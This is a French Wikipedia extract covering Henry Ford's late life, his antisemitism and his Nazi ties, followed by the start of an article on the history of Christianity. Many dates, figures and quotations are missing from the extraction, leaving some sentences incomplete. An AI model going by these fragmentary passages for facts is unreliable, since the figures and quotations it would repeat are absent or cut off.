Après l’entrée des États-Unis dans la Seconde Guerre mondiale, le plein emploi met un terme au recours à la terreur. Cependant, les salaires stagnent depuis des années et finissent par devenir très inférieurs à ceux des usines concurrentes. Les syndicats n’obtiennent toujours aucun droit dans les usines Ford, à l’inverse de celles de General Motors et de Chrysler. En avril 1941, huit ouvriers décident d’entamer une marche de protestation dans l’usine de "" en chantant "Solidarity Forever" (Solidarité pour toujours). Finalement, toute l’usine est paralysée et en partie contrôlée par l’UAW ; Ford n’a pas d’autre issue que de négocier avec le syndicat. Edsel, qui est alors président de la société, estime qu’il est nécessaire pour l’entreprise d’arriver à une sorte de convention collective avec les syndicats, les violences, les interruptions de travail et les impasses ne pouvant ainsi continuer. Mais Henry refuse pendant plusieurs années de coopérer, et on sait qu'il a confié à Bennett la tâche de faire en sorte que le dialogue avec les syndicats n’aboutisse à aucun accord.
Fin de vie et de carrière.
Les dernières années sont particulièrement frustrantes pour Henry Ford. Il n’accepte pas les changements induits par la Grande Dépression et s’oppose au "New Deal", le plan mis en œuvre par le président Roosevelt en vue de redresser la situation économique et sociale des États-Unis. Il refuse toujours de reconnaître le syndicat des travailleurs de l’automobile et utilise des policiers armés pour faire face aux mobilisations syndicales. Pour diverses raisons, Ford, seul dans son industrie, refuse de coopérer avec l’administration du redressement national, un organisme gouvernemental des années 1930 qui prépare et supervise les codes de concurrence loyale pour les entreprises et les industries.
Lorsque son fils Edsel, alors président de "Ford Motor Company", meurt d'un cancer en mai 1943, Henry Ford décide d’assumer la présidence. À ce stade de sa vie, il a déjà connu plusieurs accidents cardiovasculaires (crise cardiaque et accident vasculaire cérébral) et n’est mentalement plus apte à occuper un tel poste. La plupart des administrateurs ne veulent pas le voir comme président. Au cours des vingt dernières années, bien qu’il ne soit pas administrateur de plein exercice, le conseil d’administration et la direction ne le défient jamais ouvertement. Au cours de cette période, la société commence à péricliter, perdant plus de de dollars par mois. L’administration du président Franklin Roosevelt envisage d’ailleurs une reprise de l’entreprise pour assurer la continuité de la production pendant la guerre, mais le projet ne se concrétise pas.
En mai 1946, Henry reçoit le Jubilé d'or de l’industrie automobile américaine pour ses contributions décisives au développement de cette industrie. La première médaille d’or de l’Institut américain du pétrole lui est attribuée en reconnaissance de sa contribution exceptionnelle au bien-être de l’humanité. Ford maintient par ailleurs une résidence de vacances, connue sous le nom de "Ford Plantation", à Richmond Hill en Géorgie, dont le domaine s’étend sur . Il contribue sensiblement à la vie de la communauté locale, notamment en faisant construire une chapelle et une école, et y emploie de nombreux résidents locaux.
Sa femme Clara désire qu’Henry quitte la présidence de Ford, d’autant que le gouvernement voit d’un très mauvais œil qu’un homme de s’occupe de la gestion de la société. Le , Henry Ford, en mauvaise santé, laisse les pleins pouvoirs à son petit-fils, Henry Ford II, et prend sa retraite en . Il meurt le à d’une hémorragie cérébrale à l’âge de à "Fair Lane", sa résidence dans son domaine à Dearborn. Le service funéraire se tient dans la cathédrale anglicane Saint-Paul à Détroit, et Henry Ford est enterré dans le cimetière de la famille Ford à l’église anglicane Sainte Martha.
Antisémitisme.
Henry Ford est foncièrement antisémite. Il se base sur "Les Protocoles des Sages de Sion," texte inventé de toutes pièces probablement par la police du tsar au début du , pour affirmer que les Juifs avaient prévu de longue date que la guerre qui se profilait à l'horizon serait une « "world war" » (guerre mondiale) et il ajoute : « "How did they know it was to be a world war?" » (Comment savaient-ils que ce serait une guerre mondiale ?). Henry Ford utilise sa fortune et son influence pour distribuer des millions d'exemplaires de ce document. Nombreux sont les mouvements américains qui reprennent ses théories complotistes antisémites pour raviver une haine latente. Son antisémitisme s’exprime également dans ses mémoires : . Le thème de la conspiration juive se mêle aussi à l'anticommunisme dans ses écrits : pour Henry Ford, la révolution soviétique aurait été « la couverture externe d’un coup longuement planifié pour établir la domination d’une race ».
Se justifiant à ce sujet, il explique dans son livre " ("Le Juif International") que l’antisémitisme n’est selon lui que le pendant de l’antigoyisme de la communauté juive. "The International Jew" est un ouvrage en quatre volumes publié sous le nom d’Henry Ford qui rassemble des articles parus dans le journal "The Dearborn Independent". Une phrase dans un texte consacré à la salutaire illustre l’esprit prétendument scientifique de l’ouvrage et dont le langage est chargé de métaphores médicales : il s’agit d’une question d’, parce que .
Dans plusieurs autres passages, les Juifs sont présentés comme un qui doit faire l’objet d’un . Adolf Hitler et ses collaborateurs reprendront cette terminologie pour justifier leurs crimes. Le Juif n’est plus défini par sa religion mais par sa « race », . Il faut donc réveiller chez les jeunes la . Ford s’inspire des "Protocoles des Sages de Sion", un ouvrage qui serait , cité et commenté abondamment, comme preuve ultime et irréfutable de la conspiration juive pour s’emparer du pouvoir à l’échelle mondiale. Cet ouvrage est par ailleurs vivement critiqué par le "Times". Il y est souvent fait référence à l’Allemagne qui est décrite comme dominée par les Juifs malgré le fait qu’il .
Le thème de la complicité entre le judéo-bolchevisme et la finance capitaliste juive, dans une conspiration pour imposer à la planète un gouvernement mondial juif est abondamment repris par le nazisme. Trois volumes ont pour objet la place des Juifs aux États-Unis. Selon Ford, leur émigration massive d’Europe de l’Est en Amérique du Nord n’a rien à voir avec de prétendues persécutions : les pogroms ne sont que de la propagande ; il s’agit bel et bien d’une véritable invasion : le « "Juif international" » peut déplacer un million de personnes de la Pologne vers l’Amérique . Les Juifs sont responsables de l’introduction dans les arts de la scène aux États-Unis d’une sale et indécente, .
La contribution de Ford à la propagation de l’antisémitisme va au-delà de l’imprimé. Il travaille activement à former une communauté. Au départ réunis autour du "Dearborn Independent", ces hommes constituent une force importante dans l’évolution américaine de l’antisémitisme, et incluent un grand nombre de pro-fascistes.
En 1918, le secrétaire privé et proche ami de Ford, Ernest G. Liebold, achète un obscur hebdomadaire, le "Dearborn Independent", pour Ford. Le journal est édité par Liebold pendant huit ans, de 1920 à 1927, et atteint au maximum environ . Vincent Curcio, auteur anglais, écrit de ces publications qu’. Hitler, fasciné par les automobiles, accroche même, sur son mur, une photo de Ford. Steven Watts mentionne qu’Hitler Ford, en proclamant que : .
Dénoncée par l’"Anti-Defamation League", les articles du "Dearborn Independent" sont explicitement condamnés pour leur violence contre les Juifs. Cependant, selon le rapport des témoignages du procès, Ford n’écrit presque rien dans ces articles. Des amis et des associés d’affaires déclarent qu’ils ont mis Ford en garde sur le contenu du journal mais que Ford ne lit probablement jamais les articles ; Ford ne porta son attention que sur les gros titres du journal. Un procès en diffamation intenté par un avocat de San Francisco et par une coopérative agricole juive en réponse à des articles antisémites conduisent Ford à fermer le journal en . Des reportages tournés au moment cité ci-dessus le montrent comme étant choqué par le contenu et qu’il n’est pas au courant de sa nature. Pendant le procès, le rédacteur en chef de Ford, William Cameron, témoigne en faveur de Ford, indiquant qu’il n’a rien à voir avec les éditoriaux, même s’ils sont publiés sous son nom. Cameron déclare lors du procès en diffamation qu’il ne discute jamais avec Ford du contenu des pages et qu’il ne les envoie jamais à Ford pour approbation.
En 1927, les excuses de Ford, à la suite de la pression conjuguée des consommateurs juifs américains et même de Hollywood qui menaça d’employer des voitures Ford pour les besoins des scènes de crash, sont bien accueillies : quatre cinquièmes des centaines de lettres adressées à Ford en juillet de 1927 furent de Juifs et saluent l’industriel. En janvier 1937, une déclaration de Ford dans le "Détroit Jewish Chronicle" désavoue .
Cependant, lors du procès de Nuremberg, Baldur von Schirach, le chef des Jeunesses hitlériennes déclare avoir été influencé par la lecture de Ford. Après ses excuses en 1927, Ford se refuse à d'autres déclarations publiques au sujet des juifs. Il continue pourtant, en sous-main, de soutenir des publications antisémites. Sur ce point, l’historien Pierre Abramovici, dans l’article « Comment les firmes US ont travaillé pour le Reich » porte un jugement sévère sur les positions d’Henry Ford.
Liens avec le régime nazi.
Henry Ford reçut en 1938 la « Grand-Croix de l'ordre de l'Aigle allemand », plus haute décoration nazie pour les étrangers. Cette faveur accordée par les nazis engendre une importante controverse aux États-Unis et finit par un échange de notes diplomatiques entre le gouvernement allemand et le Département d’État. Ford s’exprime à propos de cette polémique en clamant que . Cette décoration n'aurait pas suscité la polémique, comme pour Thomas J. Watson, président d'IBM, décoré l'année précédente, si Ford n'avait pas été aussi l'auteur d'écrits antisémites et un soutien financier pour Adolf Hitler et le parti nazi. Ford a eu des relations économiques avec l'Union soviétique, jusqu'à ce que son ami Serguei Dyakanov, accusé de dérive droitière soit « purgé », jugé et exécuté en . En , le secrétaire américain au Trésor Henry Morgenthau aurait estimé que la production de la filiale française de Ford était « au seul profit de l’Allemagne ». Selon la série "Apocalypse, Hitler", dont les sources sont à confirmer, Henry Ford aurait financé dès le début des années 1930 le parti nazi en laissant des bénéfices en provenance d'Allemagne à ce parti et en versant chaque année à l'occasion de l'anniversaire d'Hitler.
Alors que Ford clame publiquement qu’il n’aime pas les gouvernements militaristes, il tire profit de la Seconde Guerre mondiale, en alimentant l’industrie de guerre des deux camps : il produit d'un côté, via ses filiales allemandes, des véhicules pour la Wehrmacht, mais aussi de l'autre des véhicules pour l’armée américaine et des véhicules de route pour l'Union soviétique. Il participe à l’effort de guerre allemand comme le faisait Opel, filiale de General Motors. En 1942, l'aviation britannique bombarde l'usine Ford de Poissy. Ford demande alors au gouvernement français de protester auprès de l’ambassade américaine à Vichy.
Divers.
La fortune personnelle de Henry Ford était colossale. D'après le blog financier "Celebrity Networth", il serait le neuvième homme le plus riche de tous les temps.
Dans le roman de Giovanni Papinni, "Gog" publié en 1931, le personnage principal rend une visite à Henry Ford dans son usine de voiture, où ce dernier lui révèle le secret de sa réussite dans les affaires ainsi que sa vision de la place des puissances dans le Monde.
Dans le roman dystopique d'Aldous Huxley, "Le Meilleur des Mondes" publié en 1932, où des procédés d’ingénierie biologique et de conditionnement mental permettent de produire des êtres humains identiques à la chaîne pour en faire des ouvriers dociles, Henry Ford (sanctifié en Notre Ford) est l'objet d'un culte religieux obligatoire, imposé par un État mondial totalitaire. Ce culte au contenu assez creux et consensuel a remplacé toutes les religions préexistantes, désormais interdites. L'auteur précise que le calendrier grégorien a été remplacé par un calendrier dont l'année zéro est celle du lancement en série de la Ford T. Huxley précise aussi que les croix latines des églises ont été coupées pour les transformer en T majuscules. Les personnages du roman emploient l'interjection : « Ford du tacot ! » (« "Ford's in his Flivver !" » en anglais) en lieu et place de « Dieu du ciel ! ».
Dans le roman uchronique "Le Complot contre l'Amérique" de Philip Roth (2004), il est le secrétaire à l'Intérieur des États-Unis du président Charles Lindbergh. Dans l'adaptation en mini-série "The Plot Against America" (2020), son rôle est joué par Ed Moran.
Dans la série de jeux vidéo "Assassin's creed", Henry Ford était membre de la branche américaine de l'ordre du Temple. Il fut un des principaux fondateurs d'Abstergo Industries avec Ransom Eli Olds.

</doc>
<doc id="1443" url="https://fr.wikipedia.org/wiki?curid=1443" title="Histoire du christianisme">
Histoire du christianisme

L'histoire du christianisme commence au au sein de la diaspora juive après la crucifixion de Jésus de Nazareth, dont la date probable se situe vers l'année 30. Les premières communautés, qui ne se définissent pas encore comme chrétiennes, sont fondées par plusieurs disciples de Jésus, en particulier dans les villes de Rome, Éphèse, Antioche, Alexandrie mais aussi en Perse et en Éthiopie. Quand il devient une religion admise puis la religion officielle de l'Empire romain au , les premiers conciles définissent peu à peu un ensemble de dogmes. Mais les christologies déclarées hérétiques dans l'Empire ne disparaissent pas pour autant. Parmi elles, l'arianisme et le nestorianisme perdurent pendant plusieurs siècles.
Au , le passage d’une grande partie des chrétiens du Moyen-Orient et d'Espagne sous domination musulmane modifie le paysage du christianisme. Au la querelle des images puis le débat sur le Saint-Esprit donnent lieu à de nouvelles controverses qui, ajoutées aux rivalités politiques, aboutissent à la séparation des Églises d'Orient et d'Occident.
Le christianisme européen, parvenu à son apogée, s'étend jusqu'en Amérique à partir du , au moment même où il se fractionne de nouveau, cette fois en raison de la Réforme protestante. Les guerres de religion qui s'ensuivent mettront plusieurs siècles à s'estomper au profit d'une rivalité plus feutrée, puis d'une recherche d'unité et de tentatives d'œcuménisme.
Les trois grandes confessions chrétiennes, le catholicisme, l'orthodoxie et le protestantisme, regroupent au près de 2 milliards et demi de fidèles répartis sur tous les continents.
Historiographie.
Longtemps, dresser l’histoire du christianisme fut une entreprise difficile. En effet, elle était cantonnée dans l’apologie de l’Église dominante dans le contexte géopolitique où se situait le candidat historien. Par exemple, des ouvrages fondamentaux comme "Oriens Christianus" de Michel Le Quien ou l’"Encyclopédie catholique" de Charles George Herbermann utilisent le mot « "catholique" » dans le sens actuel du terme pour désigner toute l’église des cinq premiers patriarcats d’avant 1054 faisant ainsi apparaître l'Église de Rome comme seule héritière légitime de l’église primitive ; les auteurs grecs, russes, des Balkans, du Caucase ou du Proche-Orient en font de même avec les églises orthodoxes. Depuis Walter Bauer, on admet qu’aucune unité doctrinale n’existait dans le christianisme ancien ; et depuis Adolf von Harnack, que le dogme cause le schisme et que l’hérésie et l’orthodoxie font système. Ainsi, l’histoire du christianisme est une longue suite de fractures mais, si son élaboration a souvent relevé de la justification anachronique "a posteriori" (sans rapport avec une stricte recherche de la restitution de faits), la méthode historique scientifique et l’évolution de disciplines telles que les sciences des religions, permettent désormais d’en cerner les vicissitudes et d’éclairer les enjeux qui ont présidé à son développement.
La question des racines juives du christianisme est problématique en soi, selon qu’on se réfère à la théologie dogmatique de telle ou telle Église ou bien aux diverses écoles d’historiens. Les Pères de l'Église fondent leurs réflexions sur les textes de la Bible, regardés comme un ensemble cohérent dont les différentes parties se complètent. À l’inverse, les chercheurs biblistes contemporains les regardent comme des textes indépendants. Durant plusieurs siècles, l’alternance des opinions et des doctrines amène les théologiens à définir avec une précision de plus en plus fine le dogme de l’Église.
Pour l’antiquité tardive, l’historiographie occidentale, héritière de Hieronymus Wolf, préfère envisager l’affirmation d’un christianisme spécifiquement occidental en tant que « nouvelle civilisation » née sous l’impulsion des Francs, comme « synthèse entre la civilisation romaine et celle des Barbares », et dont la forme particulière deviendra le catholicisme romain par opposition au christianisme byzantin décrit comme un christianisme oriental plus ou moins dissident, décadent ou déviant. Mais pour l’historiographie des pays orthodoxes, c’est l’ensemble du monde romain puis « barbare » qui, au fil des sept premiers conciles, a été orthodoxe (« Pentarchie »), avant que les suites du schisme de 1054, et notamment les innovations de l’église de Rome au fil de ses 14 conciles ultérieurs ("Filioque", purgatoire, primauté de Pierre, autorité temporelle des papes, célibat des prêtres, inquisition et bien d’autres nouveautés doctrinales ou canoniques) fassent naître, non pas une nouvelle civilisation, mais simplement une église séparée ; quant aux églises restées « orthodoxes » (patriarcats de Jérusalem, Alexandrie, Antioche et Constantinople, puis ceux apparus ensuite), elles n’ont rien de spécifiquement « oriental » dans cette vision, mais sont la continuation après 1054 de l’église du premier millénaire, de sa doctrine et de ses pratiques.
Christianisme des premiers temps.
Premiers disciples et premiers chrétiens.
La rencontre de Jésus de Nazareth avec ses premiers disciples est située par le Nouveau Testament au bord du lac de Tibériade. Ses rives abritent à cette époque des villages de pêcheurs où se déroulent de nombreux épisodes de la vie de Jésus, rapportés dans les Évangiles : la pêche miraculeuse (Lc 5, 1-11), la tempête apaisée (Lc 8, 12-25) et la dernière apparition aux disciples (Jn 21, 1s). Les quatre premiers apôtres nommés par l'Évangile de Marc sont des pêcheurs : André et son frère Simon-Pierre, ainsi que Jacques et son frère Jean, tous deux fils de Zébédée.
André, Simon-Pierre, Philippe, Nathanaël semblent venir de l'entourage de Jean le Baptiste(Jn 1, 35-51). Jésus a une trentaine d'années lorsqu'il se joint aux disciples du Baptiste. Il exerce son ministère essentiellement en Galilée, où il pratique guérisons et exorcismes pendant un ou deux ans.
La première communauté chrétienne est constituée par les premiers juifs de Jérusalem qui ont reconnu le Messie en Jésus de Nazareth, puis par leurs successeurs au-delà de la ville sainte. Elle est dirigée d'abord par Pierre jusqu'en 44 puis par Jacques le Juste, « frère du Seigneur », jusqu'en 62.
Les premières prédications se fondent sur une proclamation de foi : Jésus est le Messie, le Fils de Dieu ; il est ressuscité, et celui qui parle en rend témoignage personnellement ; il appelle à la conversion.
Le mot n'est pas utilisé par les disciples de Jésus pour parler d'eux ; ceux-ci sont habituellement appelés les . Les Actes des Apôtres indiquent que le nom de , dérivé de , fut attribué aux disciples de Jésus de Nazareth à Antioche, qui était à l'époque une ville de langue grecque. Les deux autres références les plus anciennes connues pour le terme se trouvent au : d'abord dans une citation de Tacite relatant les lendemains de l'incendie de Rome en 64, puis, dans la lettre d'Ignace d'Antioche aux Magnésiens à la fin du .
Controverses théologiques du.
Le christianisme est marqué par des controverses théologiques du au Proche-Orient.
Création du canon biblique.
L’Apôtre Paul joue un rôle important dans le développement du christianisme. Sous le nom de Saül, ce Juif originaire de Tarse aurait d’abord persécuté le "mouvement de Jésus" et ensuite connu une spectaculaire conversion après que le Christ lui fut apparu sur le chemin de Damas. Il consacre le reste de son existence au prosélytisme. Dans un premier temps, l'enseignement de Jésus n'est transmis qu'au sein de la communauté juive, puis, à la suite de difficultés avec les responsables des synagogues, l'enseignement s'oriente vers les non-juifs, les païens, aussi appelés les . Parmi ceux-ci, il en est, nombreux, sensibles à la voie du judaïsme, on les appelle les « craignant-Dieu », mais qui ne franchissent pas, pour la plupart, le pas de la conversion, en particulier celui de la circoncision. La question est débattue lors d’une réunion qui se tient à Jérusalem vers l’an 50 appelée rétrospectivement . Il y est entériné que les prosélytes « chrétiens » n'auront pas à passer d'abord par une conversion au judaïsme.
Une grande partie de cette littérature se fait sous forme d'Épîtres qui sont de courts traités de caractère moral ou philosophique, dont les auteurs ne sont pas toujours assurés.
Premiers théologiens.
Les sources contemporaines concernant cette période sont peu nombreuses. Les Actes des Apôtres (datés des années 80-90) se veulent l’histoire du mouvement au cours des premières années après la mort du Christ. Leur pertinence est toutefois remise en cause par les historiens, notamment à propos de l'« incompatibilité de la figure du Paul des Actes avec celle qui se dégage de ses lettres », ce qui les rend difficilement exploitables. En effet, les lettres de Paul de Tarse (datées des années 50) sont les plus anciens documents du christianisme. Elles fournissent des indications sur les tendances qui parcourent le mouvement à ses débuts et ne correspondent pas toujours à la description qu'en donnent les Actes.
Les premiers chrétiens ne sont pas perçus en Judée autrement que comme une des nombreuses sectes au sein du judaïsme, dont les plus importantes sont les pharisiens, les sadducéens, les zélotes et les esséniens.
Les Actes des Apôtres et les lettres de Paul laissent entrevoir des dissensions au sein de la première communauté de Jérusalem, notamment entre deux courants : les et les (issus de Palestine)
Pour la période qui suit la disparition des apôtres, les Pères de l'Église constituent une source dont on doit avoir une approche critique. C’est le début de la littérature patristique (90-160 après. J.-C.). Ces textes, de caractère non canonique dénommés souvent, les Pères Apostoliques se préoccupent avant tout d’instruction et de prédication, et non pas de reconstitution historique.
Face à la concurrence, aux courants centrifuges, mais aussi au scepticisme païen, le christianisme développe une littérature apologétique :
Irénée de Lyon, dans son "Contre les hérésies", s’attaque aux gnostiques. Il leur oppose l’unité de l’Ancien et du Nouveau Testament ainsi qu’une vision optimiste de la chute d’Adam et Ève, rachetée par le sacrifice du Christ.
Origène pose les fondements de l’herméneutique chrétienne en définissant le premier, selon Henri de Lubac, la théorie des quatre sens, et la Lectio divina, qui sont par la suite largement développés pendant tout le Moyen Âge, surtout au , et dans les débuts de la Renaissance.
La question gnostique.
Les premiers siècles du christianisme sont une période de développement théologique, passant au crible du rationalisme grec certaines notions en vue de les éclaircir.
Si l'on s'en tient à Irénée de Lyon, le gnosticisme est un terme générique désignant une série de courants de pensée, qui, entre 80 et 150, développent une conception ésotérique du christianisme. Selon ces courants, une connaissance est réservée à des élus au sujet de la nature du Mal et des moyens d’y échapper. Les gnostiques sont dualistes ; pour eux le monde matériel est étranger à Dieu et a été créé par des puissances inférieures. Ces croyances s’accompagnent de tendances soit à l’ascétisme, soit à la débauche, qui reflètent toutes deux un même mépris du monde matériel. Bien que l’idée de rédemption reste centrale, le rédempteur n’est pas nécessairement le Christ, vu leur répugnance du monde matériel. Quelques-unes enseignent que le Christ est un pur esprit et que son incarnation est une illusion optique et une apparence (en grec "dokèsis") ; on nomme ce courant docétisme (). La rédemption est réservée aux élus en qui réside une étincelle divine. Une des doctrines les plus populaires est le dualisme de Marcion (), qui distingue le Dieu des juifs du Père de Jésus, et rejette donc l’Ancien Testament. Un autre groupe dissident se forme autour de Montanus au . Originaire de Phrygie, Montanus affirmait que le Paraclet s’exprimait à travers lui. Le montanisme connaîtra un certain succès en Asie Mineure.
Ces doctrines créent le débat dans les communautés chrétiennes et incitent à l'approfondissement théologique par ceux que l’on qualifiera ensuite de Pères de l'Église à s’opposer à ces tendances et à élaborer des réfutations de ces doctrines. Ils s’y prennent de plusieurs manières :
Antiquité tardive.
Les institutions ecclésiales.
Au début du , les chrétiens sont peu nombreux et réunis en communautés diffuses. Les communautés chrétiennes prennent le nom d’ (du grec "Ekklèsia" = assemblée). Ils ne sont réellement organisés qu'au Moyen-Orient : 
Ce terme « église » ne s'applique aux bâtiments qu'à compter du de l'ère commune. Ces communautés, dans les zones où les chrétiens sont nombreux, sont dotées d’un conseil, avec à sa tête un (du grec ', surveillant) ou (du grec ', ancien). Le premier terme finira par l’emporter. Il est assisté de diacres. Les fidèles se réunissent, d’abord dans des maisons particulières, puis dans des maisons spécialement aménagées (dont il subsiste un exemple connu du à Doura Europos, où une pièce sert de lieu de réunion et une autre de baptistère).
Statut de l'empereur.
De Constantin à Justinien, il est le « président de l'Église ».
Sa position dans l’Église est clairement définie par Paul Veyne. Entre le moment où Byzance change pour devenir Constantinople, sa personne acquiert un caractère sacré; depuis Constantin il est ("isapostolos"). Il n’est pas prêtre, mais comme le prêtre, il pénètre dans le Saint des Saints, derrière l’iconostase, et communie sous les deux espèces.
L’empereur fait respecter les lois de l’Église ; les codes de et de Justinien intègrent les lois de l'Église au droit civil, y compris la dogmatique. Quand le besoin s’en fait sentir, c’est lui qui convoque les conciles œcuméniques. En principe le patriarche, comme chef de l’Église, est lui aussi l’émanation de Dieu. Dans la pratique, l’empereur nomme le patriarche comme bon lui semble, même si en théorie il choisit parmi une liste qui lui est présentée. Le patriarche choisi peut même être un laïc, comme , qui reçoit en catastrophe tous les ordres. Au cours des premiers siècles de l’empire, l’empereur intervient dans des questions de dogme. Cet interventionnisme culminera au cours de la crise iconoclaste (voir ci-dessous). Par la suite s’instaure un équilibre fragile entre l’empereur et le patriarche. Il doit en théorie régner entre eux une harmonie (telle que la définit l’ de en vue du bien-être de l’État et de l’Église. L’empereur peut difficilement franchir certaines barrières morales. On peut en donner pour exemple le quatrième mariage de , qui fait scandale. Le patriarche Nicolas Mystikos refuse alors à l’empereur l’entrée de Sainte-Sophie. Bien qu’il ait forcé le patriarche à abdiquer, Léon devra faire pénitence. Au cours des derniers siècles de l’Empire, les souverains qui veulent se rapprocher de Rome (voir ci-dessous) se heurtent à l’opposition de l’Église.
Les Byzantins voyaient dans leur empire l’image du royaume céleste et dans leur empereur l’image du souverain céleste. Il est le , et c’est de Lui qu’il tient son pouvoir (). Le couronnement à Sainte-Sophie par le patriarche de Constantinople symbolise cette sanction divine. Même dans les cas d’usurpation les plus manifestes, le patriarche ne l’a jamais refusée. Cette conception a pour conséquence que l’empereur est le seul souverain légal de la cité terrestre. C’est au nom de cette conception que les empereurs byzantins ont toujours farouchement considéré tout autre souverain chrétien comme leur subordonné. Au , lorsque l’Empire va vers sa fin, le patriarche de Constantinople rappelle au grand-duc de Moscou, qui ne se considère plus comme soumis à l’empereur, qu’.
Métropolites et papes.
Si, théoriquement, tous les évêques sont sur le même pied, certains acquièrent progressivement plus d’importance du fait de l’importance des premiers titulaires du siège : ce poids n’est pas nécessairement lié à la place du diocèse dans la structure administrative de l’Empire romain. Au sommet de cette hiérarchie se trouvent cinq sièges qu’on appellera les patriarcats à partir de Justinien et que Justinien II organisera, au concile in Trullo, en « Pentarchie ».
En Occident, la direction des premières communautés chrétiennes de Rome est longtemps de type synodal et la prééminence de l’évêque de Rome n’est que très progressive ; si, vers 220, l'évêque romain présente pour la première fois « un visage quelque peu consistant » en la personne de , il ne prend de l'importance qu'à partir de la fin du avec . Une partie des pouvoirs dont jouit l'évêque de Rome de nos jours en Occident n'est acquis qu'au sous Charlemagne, avec en 800, quand sa primauté d’honneur se transforme en primauté juridictionnelle pour la partie occidentale de l'empire.
Le patriarche romain s’opposera au canon 28 du concile de Chalcédoine (451) qui fait de Rome le second siège de l’Église à l'égale de Constantinople. Ces prétentions du pape de Rome seront mal acceptées par les Églises d’Orient, surtout quand il interviendra en matière doctrinale.
En Orient, le concile de Nicée (325) reconnaît deux grands sièges : Antioche et Alexandrie, ainsi qu’avec quelques restrictions à Jérusalem. Le concile de Constantinople (381), et surtout le concile de Chalcédoine (451), accordent à Constantinople les mêmes privilèges qu’à Rome, ainsi que la deuxième place après celle-ci. Des conflits entre patriarcats seront pour beaucoup dans les controverses qui déchireront l’Église.
À côté des cinq grands sièges, se constitueront en dehors des frontières de l’Empire romain, des Églises nationales, « autocéphales » (Arménie, Géorgie, Perse).
Construction d'un système théologique.
L'Église ancienne peut se définir comme « les enfances du christianisme » selon le mot d'André Trocmé, c'est-à-dire avant l'instauration d'un christianisme d'État dont le « président » serait l'empereur de Constantinople.
Auparavant, le débat christologique est la règle. Aucune centralité susceptible de régulation n'existe alors. Chaque évêque est maître chez soi, surtout dans les grandes communautés.
Aux , les débats théologiques sont d’autant plus violents qu’ils illustrent les rivalités entre les grandes métropoles religieuses de la partie orientale de l’Empire romain : Alexandrie, Antioche et Constantinople.
En 313, l’édit de Milan proclame la liberté de culte et prévoit de rendre aux chrétiens les biens qui leur avaient été confisqués pendant la grande persécution de Dioclétien. Sollicité par les évêques africains sur la querelle donastique, Constantin organise en 313 (ou 314) le premier concile pour que les évêques décident entre eux. Il convoque et préside le concile de Nicée (325), qui reconnaît le Jésus comme Dieu et homme à l’unanimité. L'arianisme y est condamné, mais reste diffusé dans les royaumes barbares jusqu'à leur conversion à l’« orthodoxie », achevée au .
Le pélagianisme, condamné par le concile d'Éphèse en 431 et combattu par Augustin d'Hippone, influence lui aussi durablement les débats : cette doctrine, qui exalte la liberté humaine face au rôle de la grâce (religion chrétienne), est au cœur de la controverse janséniste au .
Controverses christologiques pré-chalcédoniennes.
Avec l'accès du culte chrétien aux cultes reconnus de l'Empire, le pouvoir politique prend l'initiative de réunir des conciles œcuméniques pour trancher les différends. Le premier est le concile de Nicée, qui condamne l'arianisme en 325 et formalise la doctrine de la Trinité dans le symbole de Nicée-Constantinople.
Les controverses du portent davantage sur la question de l'incarnation : la personne de Jésus-Christ était-elle unique, en deux natures (divine et humaine), ou bien y avait-il en lui deux « personnes » distinctes, l'homme Jésus, d'une part, le Verbe divin d'autre part, ou encore cette divinité s'est elle manifestée une fois adulte, au moment de son baptême par Jean le Baptiste ? Le concile d'Éphèse proclame en 431 que le Christ n'a qu'une seule nature et qu'elle est divine, cette dernière ayant absorbé sa nature humaine. En 451, le concile de Chalcédoine proclame l'unique personne du Christ, de nature à la fois divine et humaine.
Mais les christologies déclarées hérétiques dans l'Empire ne disparaissent pas pour autant. Au sein même de l'Empire, l'arianisme se diffuse largement auprès des peuples fédérés et eut une influence importante en Europe jusqu'au ; puis l'ajout du "Filioque" au symbole de Nicée donne lieu à de nouvelles controverses.
Les conclusions du concile de Chalcédoine sont également rejetées par certaines églises d'Orient. Églises « pré-chalcédoniennes » est l'expression dont leurs ennemis désignèrent les églises des deux et trois conciles. À leurs yeux, après les conciles, elles auraient dû disparaître. En fait, ces églises sont post-concilaires en ce sens qu'elles marquèrent leur désaccord vis-à-vis des conclusions des troisième et quatrième conciles d'où le nom que les historiens leur donnent : Églises des deux conciles, Églises des trois conciles pour les distinguer des églises « orthodoxes », c'est-à-dire des 7 conciles (dont Rome faisait alors partie). C'est une façon de les déclarer hérétiques et de masquer le caractère foisonnant des christologies de l'époque.
Divisions et conquête musulmane.
Jusqu’aux conquêtes arabes, la politique impériale variera entre la répression à l’égard des adversaires des thèses chalcédoniennes et diverses tentatives d’accommodement théologique, comme l'hénotique. Sous l’empereur Justinien, la répression des monophysites aboutit à la constitution d’Églises non-chalcédoniennes dite aussi « des trois conciles », avec une hiérarchie parallèle à celle de l’Église officielle : l’Église syriaque orthodoxe, dite aussi Église jacobite en Syrie, l’Église copte orthodoxe en Égypte, qui comprennent la majorité des fidèles, ou encore l'Église apostolique arménienne. Subsiste toutefois une Église chalcédonienne, dite « melkite » (du syriaque "melek", « roi »).
Au début du , le christianisme au Proche-Orient reste donc profondément divisé entre chalcédoniens, monophysites et nestoriens quand la région est conquise par l'empire Perse à partir de 611 (l'Égypte en 618). Les Églises monophysites sont alors privilégiées par rapport aux chalcédoniens, vus comme alliés de l'Empire Byzantin. Après la reconquête byzantine (de 622 à 630), les divergences s'étant exacerbées, le patriarche Serge de Constantinople tente encore de mettre fin à la controverse du monophysisme qui divise toujours la chrétienté en contournant la question de la « nature » du Christ et propose le "monothélisme" (du grec "monos", « seul » et "thelein", « vouloir ») qui professe la seule volonté divine « seule volonté du Christ incarné ». Le monoénergisme proposé comme tentative de conciliation des doctrines est bientôt imposé aux monophysites par de nouvelles persécutions.
C'est alors qu’apparaît une nouvelle religion monothéiste, l'islam, dans les tribus arabes du Hidjaz, qui bientôt entament une guerre de conquête en direction de la Syrie, la Palestine et l'Égypte. Entre 631 et 643, trois des centres du christianisme oriental (Alexandrie, Antioche et Jérusalem) tombent aux mains des musulmans. Les Byzantins pratiquent une politique de la terre brûlée et laissent derrière eux une très mauvaise image. La vie chrétienne continue dans les régions conquises, avec le statut de "dhimmis" (« protégés »), mais seules Constantinople et Rome gardent leur liberté politique.
